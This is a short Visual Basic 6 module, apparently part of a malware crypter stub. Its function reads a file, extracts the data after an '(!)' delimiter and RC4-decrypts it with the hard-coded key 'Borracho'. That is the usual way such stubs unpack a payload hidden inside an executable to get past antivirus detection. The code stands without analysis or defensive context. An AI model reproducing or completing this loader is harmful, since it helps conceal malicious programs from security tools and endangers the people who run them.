Attribute VB_Name = "sFunctions"
Public Bin As String, File As String, rc As New Rc4, Bye() As Byte

Public Function fCall(Path As String)
 File = FreeFile
 Open Path For Binary As File
   Bin = Space(LOF(File))
   Get File, , Bin
 Close File
 Bin = Split(Bin, "(!)")(1)
 Bin = rc.DecryptString(Bin, "Borracho")
End Function
